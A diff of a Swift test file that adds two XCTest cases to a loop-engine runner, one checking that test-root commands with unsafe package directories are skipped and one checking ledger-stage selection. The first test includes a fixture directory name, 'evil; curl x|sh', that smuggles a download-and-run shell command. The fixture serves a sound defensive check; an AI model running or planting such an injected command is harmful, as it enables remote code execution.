@@ -3285,6 +3285,27 @@ final class LoopEngineRunnerTests: XCTestCase {
         XCTAssertEqual(attempt?.exitCode, 3)
     }
 
+    func testWrittenRootCommandsSkipUnsafePackageDirs() {
+        func root(_ dir: String, _ cmd: String) -> TestRoot {
+            TestRoot(packageDir: dir, testDir: dir + "/tests", runner: .pytest, command: cmd, namingRule: "", languages: ["py"])
+        }
+        let r = LoopEngineRunner.writtenRootCommands(
+            [root("sub", "cd sub && pytest"), root("evil; curl x|sh", "cd 'evil; curl x|sh' && pytest"), root("", "npm test")],
+            excluding: "npm test")
+        XCTAssertEqual(r.commands, ["cd sub && pytest"])
+        XCTAssertEqual(r.skipped, ["evil; curl x|sh"])
+    }
+
+    func testFailureLedgerSelectionIsScopedToTheTestStage() {
+        let stages = [
+            LoopStage(id: "b", name: "Build", kind: .shellCommand, command: "make", order: 0),
+            LoopStage(id: "t", name: "Test", kind: .shellCommand, command: "make test", order: 1),
+            LoopStage(id: "l", name: "Ledger", kind: .testMap, order: 2, testOp: .ledger),
+        ]
+        XCTAssertNil(LoopEngineRunner.ledgerStage(after: "b", in: stages))
+        XCTAssertEqual(LoopEngineRunner.ledgerStage(after: "t", in: stages)?.id, "l")
+    }
+
     private func artifactConfig(severity: LoopStageSeverity = .blocking) -> LoopEngineConfig {
         LoopEngineConfig(stages: [
             LoopStage(id: "g1", name: "Generate", kind: .skill, order: 0, skillId: "skills/plan-director"),
